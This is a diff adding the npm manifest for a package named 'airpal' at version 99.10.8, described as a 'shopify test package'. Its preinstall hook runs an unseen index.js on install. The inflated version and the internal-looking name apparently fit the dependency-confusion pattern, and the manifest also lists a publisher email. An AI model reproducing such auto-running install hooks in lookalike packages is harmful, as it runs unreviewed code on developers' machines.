@@ -1,0 +1,39 @@
+{
+    "name": "airpal",
+    "version": "99.10.8",
+    "description": "shopify test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "airpal@99.10.8",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-FubeaMdOJNnveuL2EGC/mO99jjm7+NQeCdtZ//qeQ9VfxPXM7MotdzXHQyWOIXp8JPuDra2QMSwGKvRzVAKWig==",
+        "shasum": "2bfe1c2076ea79d238545d2397ca9d44df0b9974",
+        "tarball": "https://registry.npmjs.org/airpal/-/airpal-99.10.8.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3214,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmnqeCRA9TVsSAnZWagAA3uIQAIaDnmwttCBGlE2W0RkT\nrTMQV7hooUuDPh171XPDyEzNMLZf8P5pyf2ODy0oOjfTcmrUsMjszMJWcxBv\nxpwUSAQqUimL5WG+OKaXqacsUzl7KAiOnRqCwkZn8xLT70M8sn/FZNWgbUGw\nX/3FG8+Ac/Gi/L8JNzFe6u0LWiUNfKcWMAfit9r48ucde0jsL6rciIyz0Cwg\n6YULzS6UqQXznyAIDYSg5GFAiiZpR7QiTVaf06wBA9aBWM0FhTtyItyFoQlP\nWHa6DPHMU2RRsu5jp47R/n9RC4PPlJoKoxTwVdzSGARTF4iAEiMAlopBqx6N\nO+q+ek85FFxuMChz6Pq8ePVYJjafhhoVDzKajcldAymT8Z9d2aq9iP6lK8Sw\nxW7fKpmyNuG1fHVgbWl19m+AMH0GIS+zzl+qhvJoFdlGzJCbQ4D7ioa5gbTR\ncMZY/1QbEC/Gb8Sw/wE30cDteII6FHEnk68SU0wqjvpXLSDoTR8L/7C2AkNb\nPKCgwKpHLaLZVW8ZM6TK70+5Uz+lkSLSpOY3uERPu5pfAbeQeMCgnlDbZ37P\nvJLMeFFT76hQxQfoETj+QiUL7c6mKoPtOXM6cIcZ0vLfT3Z20uzuo9Ca7ARj\nw354iu1cu3L4pUWZ0rLG/T5dUoFkaDW595WWXV/DCTWSxnBwjn0hzMVTpWhr\np50B\r\n=EYQ/\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/airpal_99.10.8_1637513886328_0.6587427620054611"
+    },
+    "_hasShrinkwrap": false
+}
